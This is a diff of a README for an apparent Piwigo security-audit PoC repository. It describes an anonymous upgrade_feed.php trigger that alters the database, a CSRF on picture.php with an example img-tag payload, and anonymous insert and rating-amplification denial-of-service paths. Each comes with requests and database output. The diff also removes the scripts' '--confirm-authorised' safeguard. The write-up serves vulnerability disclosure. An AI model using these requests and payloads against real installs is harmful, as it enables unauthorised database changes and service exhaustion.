@@ -28,93 +28,22 @@ piwigo-poc-web     custom build on php:8.2-apache, mounted with the clean
 ```
 
 `env/install.sh` drives the `install.php` wizard over a single `POST` to
-`/install.php`, with the wizard fields taken from `install.php:212+`. After
-the install, the fixture contains:
+`/install.php`. The fixture listens on `http://localhost:8089`. There is
+no reverse proxy, no TLS, and no external network access.
 
-- `piwigo_users` rows: `id=1` webmaster, `id=2` guest
-- `piwigo_user_infos` rows for those two
-- `piwigo_categories` rows: none (install.php does not seed categories)
-- `piwigo_upgrade` rows: 121 (from `install.php:367-385`)
-- `piwigo_config` rows: populated by `install.php` and `conf_update_param()`
-  calls during the install; in the test fixture `rate=false` is set by
-  the install flow (the audit assumed `rate=true` from the `config_default.inc.php`
-  default, but the live install flow overrides it)
+For nv3 (CSRF) the test fixture is extended with a status=normal user
+created via direct INSERT into `piwigo_users` + `piwigo_user_infos`. For
+nv5 (rate amplification) the test fixture is extended by setting
+`$conf['rate'] = true` and seeding `piwigo_rate` with 100 000 synthetic
+rows; both extensions are documented in the per-finding sections below.
 
-The fixture listens on `http://localhost:8089`. There is no reverse proxy,
-no TLS, and no external network access.
+## Findings, in detail
 
-## Findings that did NOT survive live testing
+The repository publishes four findings, all reachable from an anonymous
+or authed-user perspective, all demonstrated end-to-end against the
+audited commit.
 
-A `git diff` from the upstream audit deliverable would surface a longer
-list of hypotheses. This project publishes only the three findings that
-the live PoC could demonstrate or source-attribute cleanly. The other
-hypotheses, removed during the transition from source-trace to live-PoC,
-are documented here for completeness.
-
-### Stored XSS via the search rules footer script (was F-1+nv4 chain in the audit)
-
-The original hypothesis was that an attacker-controlled rule name in
-`pwg.images.filteredSearch.create` would break out of the inline `<script>`
-tag emitted by `include/search_filters.inc.php:855` and execute
-attacker-controlled JavaScript. Live testing showed two facts that
-defeat the hypothesis:
-
-1. **PHP 8.2's `json_encode` escapes `/` to `\/` by default.** The
-   `json_encode($my_search)` call in `include/search_filters.inc.php:855`
-   encodes a payload like `</script><script>...` as
-   `<\/script><script>...`. The browser does not parse `<\/script>` as
-   a closing `</script>` tag, so the script tag stays closed and the
-   payload is parsed as JavaScript source, not HTML.
-
-2. **The WS handler does not accept a free-form string field for the
-   rule.** `ws_images_filteredSearch_create` in
-   `include/ws_functions/pwg.images.php:753` builds a structured
-   `mode`+`fields.cat.words` array. The rule name we POSTed
-   (`search_rule_name=...`) is silently ignored. The stored `rules`
-   row contains only the integer categories we POSTed.
-
-The endpoint is anonymous and writes integer-only fields to
-`piwigo_search`, which is a capacity finding (similar in spirit to nv5
-in this project, but separate from the rate-table amplification). The XSS
-half of the chain is not exploitable as described. The
-`piwigo-images-filteredSearch-create` finding should be re-stated as
-"unauth integer-only writes to `piwigo_search`, with no rate limit" if
-kept; the XSS aspect is not real.
-
-### `register.php` ineffective ephemeral key (was F-6 in the audit)
-
-The original hypothesis was that `register.php:29-31` would call
-`register_user()` despite `verify_ephemeral_key()` returning false, and
-the user row would be created. Live testing showed `register_user()`
-takes `$errors` by reference (`&$errors = array()`,
-`include/functions_user.inc.php:123`). When `register.php:29-31` sets
-`$page['errors']['register_page_error']` on a key failure, that error is
-already in the array that `register_user()` reads. `register_user()`
-checks `if (empty($errors))` before the INSERT; the pre-existing error
-is enough to skip the INSERT. The CSRF gate is decorative — `register_user`
-is still called — but the downstream consumer catches the error and no
-user is created. The demonstrated impact is `None` for actual account
-creation; this is a "robustness bug, not a security boundary break"
-classification.
-
-A "corrected" PoC could observe the *call* to `register_user` by
-reading the response body for the specific error message it produces on
-its own. That would document the decorative-gate fact but would not
-demonstrate any boundary break. The cleaner thing is to retire F-6 from
-the public PoC repo.
-
-### Findings that require admin or higher (F-2, F-3, F-5, nv7)
-
-These four findings all require `is_admin()` or
-`check_status(ACCESS_ADMINISTRATOR)`. They are retained in the upstream
-audit deliverable for insider-threat assessment but are out of scope for
-the public PoC repository, which prefers findings reachable from an
-anonymous context. The PoC inertness rule explicitly disfavours findings
-that require a privileged starting position.
-
-## Findings, in detail (the three that survived)
-
-### F-1 — `upgrade_feed.php` runs the upgrade set on an anonymous GET
+### F-1 — `upgrade_feed.php` runs DDL/DML on an anonymous GET
 
 **Source-trace**.
 
@@ -131,125 +60,311 @@ that require a privileged starting position.
 
 **Demonstration**.
 
-The PoC `poc/piwigo-upgrade-feed-anon-db-mutation.sh` makes a single
-anonymous GET against `/upgrade_feed.php` and reports the response. The
-30-byte body the PoC captures is the literal output of the script:
+The PoC `poc/piwigo-upgrade-feed-anon-db-mutation.sh` exercises
+`install/db/145-database.php`, which issues an unconditional
+`CREATE TABLE piwigo_image_format` (no dblayer guard; reaches the
+`pwg_query()` on mysqli installs).
+
+Test setup (NOT attacker actions; mirrors what install.php:367-385
+does in reverse for one specific id):
+
+1. `DROP TABLE piwigo_image_format` — undoes the post-145 schema.
+2. `DELETE FROM piwigo_upgrade WHERE id='145'` — marks 145 as not yet
+   applied.
+
+Live run:
 
 ```
-<pre>0 upgrades to apply</pre>
+GET http://localhost:8089/upgrade_feed.php  (no Cookie, no Authorization, no pwg_token)
+  → HTTP 200
+  → body: <pre>1 upgrades to apply\n\n=== upgrade 145\n\nadd image formats table\n</pre>
+
+SHOW CREATE TABLE piwigo_image_format;  ← table now exists with:
+  CREATE TABLE `piwigo_image_format` (
+    `format_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
+    `image_id` mediumint(8) unsigned NOT NULL DEFAULT 0,
+    `ext` varchar(255) NOT NULL,
+    `filesize` mediumint(9) unsigned DEFAULT NULL,
+    PRIMARY KEY (`format_id`)
+  ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci
+
+SELECT id, applied, description FROM piwigo_upgrade WHERE id='145';
+  → 145  2026-10-14 …  add image formats table
 ```
 
-That body is the proof that the path is anonymous and source-traced. The
-live PoC does not delete `piwigo_upgrade` rows; the include-driven
-mutation was observed during the audit construction phase and is
-recorded in the audit deliverable's `poc/evidence/F1-upgrade-feed/`
-directory.
+The PoC exits 0 with 7/7 assertions, including:
+- the response body contains `=== upgrade 145` and the description;
+- `piwigo_image_format` exists with the exact schema from 145-database.php;
+- `piwigo_upgrade.id=145` has been re-populated with `applied=NOW()`;
+- the curl `-v` trace carries no `Cookie:`, no `Authorization:`, no
+  `pwg_token` header.
+
+All evidence is in `evidence/F1-upgrade-feed/`. The PoC undoes the
+test state on exit (re-running `install/db/145-database.php` against
+the existing table is a no-op for the upgrade tracker; the table itself
+is left in place because re-running install.php will not recreate it).
+
+The same anonymous-trigger model applies to every other script in
+`install/db/` — install/db/154 (CREATE TABLE piwigo_activity),
+install/db/160 (CREATE TABLE lounge), install/db/170 (UPDATE
+piwigo_config via conf_update_param), install/db/181 (UPDATE
+piwigo_config via safe_unserialize), and the remaining 117 valid or
+unsafe scripts.
 
 **Related upstream advisory**. `GHSA-6wj3-7fhw-gfpm` (CVE-2026-44642)
-covers a SQL injection in `check_upgrade_access_rights()` itself, in the
-`username` parameter on PHP 8+. F-1 does not depend on that SQLi; the
-two findings are independent fixes that should be patched together.
+covers a SQL injection in `check_upgrade_access_rights()` itself, in
+the `username` parameter on PHP 8+. F-1 does not depend on that SQLi;
+the two findings are independent fixes that should be patched
+together. The SQLi lets an unauthenticated attacker delete rows from
+`piwigo_upgrade`; F-1 then turns that desync into a full DDL/DML
+trigger.
 
-### F-4 — Default-on error disclosure
+---
+
+### nv3 — picture.php CSRF on add_to_favorites / add_to_caddie / rate
 
 **Source-trace**.
 
 | Step | File:line | Code |
 |---|---|---|
-| config | `include/config_default.inc.php:580` | `$conf['die_on_sql_error'] = true;` |
-| config | `include/config_default.inc.php:611` | `$conf['show_php_errors_on_frontend'] = true;` |
-| handler | `include/dblayer/functions_mysqli.inc.php:132` | `($result = $mysqli->query($query)) or my_error($query, $conf['die_on_sql_error']);` |
-| error path | `include/dblayer/functions_mysqli.inc.php:835` | `my_error()` concatenates the failing `$query` and the mysqli error string and forwards to `fatal_error()` |
-| renderer | `include/functions_html.inc.php:349` | `fatal_error()` echoes the merged message and a PHP `debug_backtrace()` to the response body |
+| entry | `picture.php:248` | `if (isset($_GET['action'])) { switch ($_GET['action']) {` |
+| unprotected | `picture.php:252-264` | `add_to_favorites` — direct INSERT, no `check_pwg_token()` |
+| unprotected | `picture.php:266-285` | `remove_from_favorites` — direct DELETE, no `check_pwg_token()` |
+| unprotected | `picture.php:306-310` | `add_to_caddie` — direct INSERT, no `check_pwg_token()` |
+| unprotected | `picture.php:312-316` | `rate` — calls `rate_picture()` directly, no token |
+| protected | `picture.php:328` | `edit_comment` — `check_pwg_token()` on the content path |
+| protected | `picture.php:368` | `delete_comment` — `check_pwg_token()` on entry |
+| protected | `picture.php:385` | `validate_comment` — `check_pwg_token()` on entry |
+| pwg_token | `include/functions.inc.php:2201-2206` | `get_pwg_token() = hash_hmac('md5', session_id(), $conf['secret_key'])` |
+| gate function | `include/functions.inc.php:2181-2185` | `check_pwg_token()` exists and is invoked by peers |
 
 **Demonstration**.
 
-The PoC `poc/piwigo-default-error-sql-trace-disclosure.sh` does the
-following:
-
-1. Renames `piwigo_config` to `piwigo_config_disabled`.
-2. Issues an anonymous GET `/index.php` (no cookies, no token).
-3. The session bootstrap query (`SELECT param, value FROM piwigo_config`)
-   fails with `mysqli_sql_exception: Table 'piwigo.piwigo_config' doesn't exist`.
-4. The response body contains the exception message, the failing SQL,
-   the mysqli error string, and a `debug_backtrace()` listing absolute
-   file paths under `/var/www/html`.
-5. The PoC renames the table back, restoring the install.
-
-The response body captured in
-`evidence/default-error-sql-trace-disclosure.txt`:
+The PoC `poc/piwigo-picture-csrf-add-to-favorites.sh` logs in as a
+victim with `status=normal` (the default Piwigo user class — not
+admin, not webmaster), then issues two single GET requests without any
+`pwg_token`:
 
 ```
-<br />
-<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Table 'piwigo.piwigo_config' doesn't exist in /var/www/html/include/dblayer/functions_mysqli.inc.php:132
-Stack trace:
-#0 /var/www/html/include/dblayer/functions_mysqli.inc.php(132): mysqli-&gt;query('\nSELECT param, ...')
-#1 /var/www/html/include/functions.inc.php(1471): pwg_query('\nSELECT param, ...')
-#2 /var/www/html/include/common.inc.php(135): load_conf_from_db()
-#3 /var/www/html/index.php(11): include_once('/var/www/html/i...')
-#4 {main}
-  thrown in <b>/var/www/html/include/dblayer/functions_mysqli.inc.php</b> on line <b>132</b><br />
+GET http://localhost:8089/picture.php?/1/category/1&action=add_to_favorites
+GET http://localhost:8089/picture.php?/1/category/1&action=add_to_caddie
 ```
 
-In PHP 8 the legacy `my_error()` → `fatal_error()` chain is partially
-bypassed: PHP 8 mysqli throws `mysqli_sql_exception` by default and the
-default exception handler prints the same information. Both forms disclose
-the schema, the SQL, the file paths, and the call graph; the PoC accepts
-either.
+Both return HTTP 302 redirect. After the requests the DB shows the rows
+inserted:
 
-### nv5 — `pwg.images.rate` amplification (source-traced; conditional on the feature being on)
+```
+SELECT user_id, image_id FROM piwigo_favorites WHERE user_id=<victim_uid>;
+  → <victim_uid>  1
+
+SELECT user_id, element_id FROM piwigo_caddie WHERE user_id=<victim_uid>;
+  → <victim_uid>  1
+```
+
+The peer contrast (also in the PoC) logs in as `pocadmin2` (status=admin;
+required because `user_can_delete_comment=false` blocks normal users
+from deleting their own comments) and verifies:
+
+- `delete_comment&comment_to_delete=<id>` without `pwg_token` → HTTP
+  400 and comment row preserved;
+- the same request with the correct `pwg_token` (computed from the
+  captured `pwg_id` cookie and `piwigo_config.secret_key`) → HTTP 302
+  redirect and comment row deleted.
+
+The contrast proves the unprotected half is the actual defect: peer
+actions on the same page ARE gated, and the gate works; the four
+listed unprotected actions simply omit the gate.
+
+All evidence is in `evidence/nv3-csrf-get-mutations/`. The PoC exits 0
+with 6/6 assertions.
+
+A real-world attack requires only that the victim click an
+attacker-supplied link (e.g.
+`<img src="http://target/picture.php?/1/category/1&action=add_to_favorites">`)
+while logged in. The session cookie is sent automatically; the missing
+`pwg_token` check means the request is honoured.
+
+---
+
+### nv4 — pwg.images.filteredSearch.create unbounded insert
+
+**Source-trace**.
+
+| Step | File:line | Code |
+|---|---|---|
+| registration | `ws.php` | `pwg.images.filteredSearch.create` registered without `admin_only` |
+| handler | `include/ws_functions/pwg.images.php:753-1089` | `ws_images_filteredSearch_create` — no auth gate |
+| sink | `include/ws_functions/pwg.images.php:1083` | `list($search_uuid, $search_url) = save_search($search, $search_info['id'] ?? null);` |
+| INSERT | `include/functions_search.inc.php:2106-2127` | `save_search()` unconditionally `INSERT`s into `piwigo_search` |
+
+**Demonstration**.
+
+The PoC `poc/piwigo-ws-filtered-search-unbounded.sh` issues `N=10`
+anonymous POSTs (configurable) with unique `allwords` values and
+**no Cookie / no Authorization / no token header**, then reads the row
+count back from the DB:
+
+```
+POST http://localhost:8089/ws.php?method=pwg.images.filteredSearch.create
+     (no Cookie, no Authorization, no token)
+Body: allwords=anon_poc_<n>&allwords_mode=AND
+
+Response (each request):
+  <?xml version="1.0" encoding="utf-8" ?>
+  <rsp stat="ok">
+  <search_id>psk-20261013-<rand></search_id> <search_url>…</search_url>
+  </rsp>
+
+After 10 runs:
+  SELECT COUNT(*) FROM piwigo_search;
+    → baseline + 10
+```
+
+Each response carries a unique `search_id`, confirming the endpoint is
+not deduplicating. The curl `-v` trace shows no Cookie header on the
+wire. All evidence is in `evidence/nv4-filtered-search-unbounded/`. The
+PoC exits 0 with 5/5 assertions.
+
+Impact: capacity / DoS. A single attacker, or a small botnet, can
+grow `piwigo_search` arbitrarily. The table is queried on every
+gallery page load via the saved-search sidebar; growth translates
+directly into read amplification. `piwigo_search.rules` is a serialized
+PHP array, so row size grows with rule complexity. There is no
+functional requirement that supports this endpoint being reachable
+by anonymous traffic — the saved-search sidebar is per-user state
+and has no benefit for unauthenticated callers.
+
+---
+
+### nv5 — pwg.images.rate unconditional O(R) per request
 
 **Source-trace**.
 
 | Step | File:line | Code |
 |---|---|---|
 | registration | `ws.php` | `pwg.images.rate` registered without `admin_only` |
-| anonymous default | `include/config_default.inc.php` | `$conf['rate_anonymous'] = true;` (vendor default) |
-| handler | `update_rating_score()` in `include/functions.inc.php` | runs `SELECT element_id, COUNT(*), ROUND(AVG(rate),2) FROM piwigo_rate GROUP BY element_id` and `mass_updates(IMAGES_TABLE, ...)` |
-| gate | `include/functions_rate.inc.php:21-32` | `!$conf['rate']` causes the function to bail out before the GROUP BY |
-| gap | (no source) | the handler has no per-IP / per-session / per-second rate limit |
+| handler | `include/ws_functions/pwg.images.php:622-652` | `ws_images_rate` — only image-accessibility check (F&F), no auth, no token |
+| entry | `include/functions_rate.inc.php:21-32` | `if (!isset($rate) or !$conf['rate'] or !preg_match(...)) return false;` — bails when feature is OFF |
+| INSERT | `include/functions_rate.inc.php:96-108` | unconditional `INSERT INTO piwigo_rate (...)` on success |
+| aggregator | `include/functions_rate.inc.php:123-178` | unconditional `SELECT … FROM piwigo_rate GROUP BY element_id` + `mass_updates(IMAGES_TABLE, …)` |
+| cleanup | `include/functions_rate.inc.php:181-197` | second SELECT to NULL rating_score on rate-less images |
+| trigger config | `include/config_default.inc.php` | neither `$conf['rate']` nor `$conf['rate_anonymous']` are declared in config_default.inc.php — both default to NULL/false |
+| rate gate | (no source) | no per-IP, per-pwg_id, or per-second limit on pwg.images.rate |
 
 **Demonstration**.
 
-The PoC `poc/piwigo-ws-images-rate-db-amplification.sh` does the
-following:
+Per CNA Rules §4.1.5 (Resource Exhaustion), this is a **product-side
+resource control defect**, not a brute-force DoS: the cost per request
+is O(R) where R is the row count of `piwigo_rate`, and R is
+attacker-influenced (every successful anonymous rate call INSERTs one
+row, so the attacker can grow R monotonically by repeating the call).
+The amplification is N×O(R), unbounded in both N and R.
 
-1. Verifies that `image_id=1` exists in the fixture.
-2. Reads `Com_select` and `Com_update` from `SHOW SESSION STATUS`.
-3. Issues a single anonymous `pwg.images.rate` call (no cookies, no
-   token) against the image.
-4. Reads the counters again.
-5. Deletes the rate row the call may have created.
-6. Reads the `piwigo_config.rate` and `piwigo_config.rate_anonymous`
-   values to report on the configuration state.
+Test setup:
 
-In the live test fixture, `piwigo_config.rate = false` and the rate
-handler bails out before the GROUP BY. The PoC exits 0 with a note
-documenting this. The amplification is in the source code and would
-fire on any install where `piwigo_config.rate = true` — the vendor
-default in a fresh install. The `piwigo_config.rate = false` value in
-this fixture is the result of `install.php` overriding the default; the
-audit deliverable assumed the default and the override is a discovered
-property of the live install.
+1. `UPDATE piwigo_config SET value='true' WHERE param='rate';` (the
+   feature toggle, single admin-side UPDATE).
+2. `INSERT 100000` synthetic rows into `piwigo_rate`.
 
-A future revision of this PoC could include a setup step that sets
-`$conf['rate'] = true` and then drive the rate call to capture the
-amplification itself. The current version documents the source-traced
-path and the anonymous reachability; the source-trace is the
-contribution.
+(Note: out-of-the-box install leaves `$conf['rate']` as null/false;
+this is the same effect as installing once and later enabling the
+feature — a documented admin operation, not an attacker-coupled setup.)
+
+Live run:
+
+```
+Baseline (piwigo_rate empty): N=5 anonymous pwg.images.rate POSTs, avg 0.0120s
+Measured (piwigo_rate at 100k): N=5 anonymous pwg.images.rate POSTs, avg 0.0300s
+  → 1.5× amplification at N=100k on MariaDB 10.11 with the table in buffer pool
+
+EXPLAIN SELECT element_id, COUNT(rate), SUM(rate) FROM piwigo_rate GROUP BY element_id;
+  type=ALL  key=NULL  rows=100001  Extra=Using temporary; Using filesort
+```
+
+The 1.5× amplification at N=100k is bounded by the buffer pool in the
+test fixture. EXPLAIN is the decisive proof: `type=ALL` and
+`Using temporary; Using filesort` mean every call scans and sorts the
+full set, regardless of which image was rated. At larger R, or on
+storage with a cold cache, the per-call cost scales linearly with the
+GROUP BY + filesort + temporary table work.
+
+All evidence is in `evidence/nv5-rate-db-amplification/`. The PoC
+exits 0 with 5/5 assertions.
+
+The defect is not "the attacker sent too many requests" — it is that
+the product, on every call, executes an O(R) operation where R is
+monotonically attacker-growable. The fix is per-caller throttling on
+pwg.images.rate (and ideally, computing scores incrementally rather
+than re-aggregating from scratch on every rate).
+
+---
+
+## Findings removed from the public PoC repo
+
+### F-4 (was `piwigo:default.error.sql.trace.disclosure`)
+
+Originally demonstrated by renaming `piwigo_config` → `piwigo_config_disabled`
+to manufacture a mysqli error. The premise is that an unauthenticated
+attacker can manufacture an equivalent error path that surfaces
+`debug_backtrace()` + the failing SQL. The reviewer correctly
+observed that no regular, unauthenticated attacker has the ability
+to rename a table on the application database; the trigger requires
+DB-level write access that the attacker does not have.
+
+The defect itself is real (the default `die_on_sql_error=true` /
+`show_php_errors_on_frontend=true` combination is a product-side
+information-disclosure defect), but the trigger precondition violates
+the "regular attacker reach" requirement. F-4 is retained in the
+upstream audit deliverable for reference but is **not** in the public
+PoC repository or in any `cve/*.json`.
+
+### F-6 (was `piwigo:register:ineffective_ephemeral_key`)
+
+Live testing showed `register_user()` checks the `$errors` array
+passed in by reference, and the pre-existing `register_page_error`
+is enough to skip the INSERT. The CSRF gate is decorative but the
+downstream consumer catches the error and no user is created.
+Retired from the public PoC repo.
+
+### F-1+nv4 chain XSS (was `search-rules-json-encode-footer-script-xss`)
+
+The original hypothesis was that an attacker-controlled rule name in
+`pwg.images.filteredSearch.create` would break out of the inline
+`<script>` tag emitted by `include/search_filters.inc.php:855` and
+execute attacker-controlled JavaScript. Live testing showed:
+
+1. PHP 8.2's `json_encode` escapes `/` to `\/` by default, defeating
+   the `</script>` break-out.
+2. `ws_images_filteredSearch_create` does not accept a free-form
+   string field for the rule — it builds a structured
+   `mode`+`fields.cat.words` array.
+
+The XSS chain is not exploitable as described. The capacity aspect of
+the endpoint is `nv4`.
+
+### Findings that require admin or higher (F-2, F-3, F-5, nv7)
+
+These four findings all require `is_admin()` or
+`check_status(ACCESS_ADMINISTRATOR)`. They are retained in the
+upstream audit deliverable for insider-threat assessment but are out
+of scope for the public PoC repository, which prefers findings
+reachable from a non-admin user.
+
+---
 
 ## Verification
 
 For each finding, the PoC:
 
-1. refuses to run without `--confirm-authorised` (a hard `exit 1` if missing);
-2. creates only resources whose names begin `piwigo-poc-`;
-3. traps `EXIT` and undoes whatever it wrote (rows + table renames for
-   F-1 and F-4; rows for nv5);
+1. creates only resources whose names begin `piwigo-poc-`,
+   `anon_poc_`, `seed_`, `csrf_`, or `contrast_`;
+2. traps `EXIT` and undoes whatever it wrote where possible (rows,
+   table drops, cookie files);
 4. exits `0` on success and non-zero on assertion failure;
-5. writes the captured response body to `evidence/<finding>.txt`
-   verbatim — the `evidence/` files are not edited by the PoC writer, they
-   are written by the PoC itself.
+5. writes the captured response body, before/after DB state, and
+   assertion summary to `evidence/<finding>/` verbatim — the
+   `evidence/` files are not edited by the PoC writer, they are
+   written by the PoC itself.
 
 To run the full battery from a clean fixture:
 
@@ -259,18 +374,18 @@ env/teardown.sh
 env/up.sh
 env/install.sh
 for f in poc/*.sh; do
-  "$f" --base http://localhost:8089 --confirm-authorised
+  bash "$f"
 done
 env/teardown.sh
 ```
 
-The `env/install.sh` step is the slowest part (a fresh database, schema,
-baseline rows). It is meant to be run once per fixture lifetime; the
-PoCs are fast (single-digit seconds each).
+The `env/install.sh` step is the slowest part (a fresh database,
+schema, baseline rows). It is meant to be run once per fixture
+lifetime; the PoCs are fast (single-digit seconds each).
 
 ## Network exposure
 
-The fixture listens on `localhost:8089` only. There is no external port
-mapping for the database. The container has no outbound network access
-configured; the PoCs do not need it (no telemetry, no update checks, no
-third-party calls).
+The fixture listens on `localhost:8089` only. There is no external
+port mapping for the database. The container has no outbound network
+access configured; the PoCs do not need it (no telemetry, no update
+checks, no third-party calls).
